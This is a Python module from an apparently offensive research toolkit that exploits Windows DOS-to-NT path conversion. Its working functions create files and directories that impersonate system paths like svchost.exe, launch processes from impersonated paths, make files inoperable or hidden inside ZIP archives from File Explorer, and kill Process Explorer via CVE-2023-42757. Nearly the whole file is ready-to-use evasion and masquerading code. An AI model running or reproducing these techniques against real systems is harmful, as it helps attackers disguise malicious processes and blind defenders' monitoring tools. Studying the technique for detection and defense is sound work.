import tempfile
import os
import shutil
import zipfile
import uuid
from ctypes.wintypes import HANDLE

from magic_dot.nt_create_user_process.nt_create_user_process import nt_create_user_process
from magic_dot.file_utils import nt_path, nt_makedirs, set_short_name, get_short_name, dos_path

DOTS_FILE_NAME = "..."


def generate_impersonated_path(target_path: str, near: bool) -> str:
    r"""
    Generates a path that impersonates another path. Once the generated path is referenced
    by a DOS path, and converted by Windows to an NT path, it references a different chosen path.
    For example, if the desired path to impersonate to is "C:\Windows\System32\svchost.exe", then
    the generated path is "\??\C:\Windows.\System32\svchost.exe". If the generated path is
    referenced by a DOS path, then as part of the DOS-to-NT conversion process in Windows, the
    trailing dot from "Windows." is removed, resulting the path "C:\Windows\System32\svchost.exe".

    :param target_path: The path to impersonate to
    :param near: Should the resulted path be in the same folder of "target_path"
    :return: The generated path, as an NT path
    """
    impersonated_path = ""
    if near:
        impersonated_path = f"{target_path}."
    else:
        target_file_path_split = target_path.split("\\")
        top_level_directory = os.path.join(f"{target_file_path_split[0]}\\", target_file_path_split[1])
        under_top_level_directory = os.path.join(*target_file_path_split[2:])
        impersonated_path = os.path.join(f"{top_level_directory}.", under_top_level_directory)

    return nt_path(impersonated_path)


def generate_inoperable_path(parent_dir_path: str):
    """
    Generates a path that is inoperable. Once the generated path is referenced
    by a DOS path, and converted by Windows to an NT path, it references a non-existent
    path.

    :param parent_dir_path: The parent path of the resulted generated path
    :return: The generated inoperable path, as an NT path.
    """
    target_path = os.path.join(parent_dir_path, str(uuid.uuid4()))
    return generate_impersonated_path(target_path, near=True)


def generate_dots_path(parent_dir_path: str):
    r"""
    Generates a path with a last path element made only from dots. If this path is
    referenced with a DOS path, then the last path element will always be removed
    as part of Windows' DOS-to-NT path conversion process, eventually referencing
    the parent directory of the path. These paths will usually create many issues
    when referenced with DOS paths by normal software.

    :param parent_dir_path: The parent path of the resulted generated path
    :return: The generated path, as an NT path
    """
    parent_dir_abs_path = os.path.abspath(parent_dir_path)
    dots_path = nt_path(os.path.join(parent_dir_abs_path, DOTS_FILE_NAME))

    while os.path.exists(dots_path):
        dots_path += "."

    return dots_path


def create_magic_dot_file(file_path: str, copy_from: str = None):
    """
    Creates a file in given path even its path has trailing dots or spaces
    in some of its path elements

    :param file_path: The path to the file to create.
    :param copy_from: A path to a file with the content to write into the new file, defaults to None
    """
    if copy_from is not None:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copyfile(copy_from_abs_path, nt_path(file_path))
    else:
        open(nt_path(file_path), "wb").close()


def create_magic_dot_dir(dir_path: str, copy_from: str = None):
    """
    Creates a directory in given path even its path has trailing dots or spaces
    in some of its path elements

    :param dir_path: The path to the directory to create.
    :param copy_from: A path to a directory with the content to write into the new directory,
                        defaults to None
    """
    if copy_from:
        copy_from_abs_path = os.path.abspath(copy_from)
        shutil.copytree(copy_from_abs_path, nt_path(dir_path))
    else:
        os.mkdir(nt_path(dir_path))


def create_inoperable_file(parent_dir_path: str, copy_from: str = None) -> str:
    """
    Creates an inoperable file. Read generate_inoperable_path's docstring.

    :param parent_dir_path: The directory to create the file in
    :param copy_from: A path to a file with the content to write into the new file, defaults to None
    :return: The path to the new file, as an NT path
    """
    dots_file_path = generate_inoperable_path(parent_dir_path)
    create_magic_dot_file(dots_file_path, copy_from)

    return dots_file_path


def create_inoperable_dir(parent_dir_path: str, copy_from: str = None) -> str:
    """
    Creates an inoperable directory. Read generate_inoperable_path's docstring.

    :param parent_dir_path: The directory to create the directory in
    :param copy_from: A path to a directory with the content to write into the new directory,
                        defaults to None
    :return: The path to the new directory, as an NT path
    """
    dots_file_path = generate_inoperable_path(parent_dir_path)
    create_magic_dot_dir(dots_file_path, copy_from)

    return dots_file_path


def create_dots_file(parent_dir_path: str, copy_from: str = None) -> str:
    """
    Creates a file with a name made only from dots.

    :param parent_dir_path: The directory to create the file in
    :param copy_from: A path to a file with the content to write into the new file, defaults to None
    :return: The path to the new file, as an NT path
    """
    dots_file_path = generate_dots_path(parent_dir_path)
    create_magic_dot_file(dots_file_path, copy_from)

    return dots_file_path


def create_dots_dir(parent_dir_path: str, copy_from: str = None):
    """
    Creates a directory with a name made only from dots.

    :param parent_dir_path: The directory to create the directory in
    :param copy_from: A path to a directory with the content to write into the new directory,
                        defaults to None
    :return: The path to the new directory, as an NT path
    """
    dots_dir_path = generate_dots_path(parent_dir_path)
    create_magic_dot_dir(dots_dir_path, copy_from)

    return dots_dir_path


def create_impersonated_file(
    target_file: str,
    copy_from: str = None,
    near: bool = False,
    use_existing_short_name: bool = False,
    use_specific_short_name: str = None,
) -> str:
    """
    Read generate_impersonated_path's docstring.
    Creates a file that impersonates a different file on the filesystem. Basically, creates
    a file in a path generated by the generate_impersonated_path() function. In addition, 
    it's possible to choose that the generated file will impersonate the short name of the
    target file. Impersonating the short name of the target file can be done in two ways:
    1. Impersonate the existing short name of the target file
    2. Set a short name for the target file and impersonate its path

    :param target_file: The target file to impersonate to
    :param copy_from: A path to a file with the content to write into the new file
    :param near: Should the resulted path be in the same folder of "target_file", defaults to False
    :param use_existing_short_name: Should the file impersonate the path for the short name of
                                    "target_file", defaults to False
    :param use_specific_short_name: A short name to set for the target file, leading the resulted 
                                    file to impersonate it, instead of the normal name, defaults to
                                    None
    :return: The path the new file, as an NT path
    """
    target_file_abs_path = os.path.abspath(target_file)

    if use_specific_short_name != None:
        set_short_name(target_file_abs_path, use_specific_short_name)

    if use_specific_short_name or use_existing_short_name:
        target_file_abs_path = get_short_name(target_file_abs_path)

    impersonated_file_path = generate_impersonated_path(target_file_abs_path, near)
    nt_makedirs(os.path.dirname(impersonated_file_path))

    create_magic_dot_file(impersonated_file_path, copy_from)

    return impersonated_file_path


def create_impersonated_dir(
    target_dir: str,
    copy_from: str = None,
    near: bool = False,
    use_existing_short_name: bool = False,
    use_specific_short_name: str = None,
) -> str:
    """
    Read generate_impersonated_path's docstring.
    Creates a directory that impersonates a different directory on the filesystem.
    Basically, creates a directory in a path generated by the generate_impersonated_path()
    function. In addition, it's possible to choose that the generated directory will
    impersonate the short name of the target directory. Impersonating the short name of the
    target directory can be done in two ways:
    1. Impersonate the existing short name of the target directory
    2. Set a short name for the target directory and impersonate its path

    :param target_dir: The target directory to impersonate to
    :param copy_from: A path to a directory with the content to write into the new directory
    :param near: Should the resulted path be in the same folder of "target_dir", defaults to False
    :param use_existing_short_name: Should the directory impersonate the path for the short name of
                                    "target_dir", defaults to False
    :param use_specific_short_name: A short name to set for the target directory, leading the
                                    resulted directory to impersonate it, instead of the normal
                                    name, defaults to None
    :return: The path the new directory, as an NT path
"""
    target_dir_abs_path = os.path.abspath(target_dir)

    if use_specific_short_name != None:
        set_short_name(target_dir_abs_path, use_specific_short_name)

    if use_specific_short_name or use_existing_short_name:
        target_dir_abs_path = get_short_name(target_dir_abs_path)

    impersonated_dir_path = generate_impersonated_path(target_dir_abs_path, near)
    nt_makedirs(os.path.dirname(impersonated_dir_path))

    create_magic_dot_dir(impersonated_dir_path, copy_from)

    return impersonated_dir_path


def create_impersonated_process(impersonate_to_path: str, exe_path: str) -> HANDLE:
    """
    Runs an executable from a path that impersonates a path.
    Read generate_impersonated_path's docstring.

    :param impersonate_to_path: The path to impersonate to
    :param exe_path: The path for the executable to run
    :return: A handle to the running process, after it was run
    """
    impersonated_file_path = create_impersonated_file(impersonate_to_path, exe_path, False)
    return nt_create_user_process(impersonated_file_path, os.path.abspath(dos_path(impersonate_to_path)))


def add_invisible_file_to_zip(zip_file_path: str, file_path: str):
    """
    Adds a file to a ZIP archive in a way that File Explorer does not
    present it to users that list or extract the archive. This is done
    by creating a folder

    :param zip_file_path: The path to the ZIP archive to add the file into
    :param file_path: The path to the file to add into the ZIP archive
    """
    zip_file_abs_path = os.path.abspath(zip_file_path)
    file_abs_path = os.path.abspath(file_path)
    with zipfile.ZipFile(zip_file_abs_path, "a") as zip:
        zip.write(file_abs_path, f"..\\{os.path.basename(file_abs_path)}")


def disable_procexp():
    """
    Exploits CVE-2023-42757. Runs a process with a name that leads
    Process explorer to close and to be unable to run again as longs
    as this process is running.
    """
    temp_path = tempfile.gettempdir()
    disabling_process_path = os.path.join(temp_path, "a" * 255)
    cmd_exe_path = os.path.expandvars(r"%systemroot%\System32\cmd.exe")
    shutil.copyfile(cmd_exe_path, nt_path(disabling_process_path))
    nt_create_user_process(disabling_process_path, hide_console_window=True)
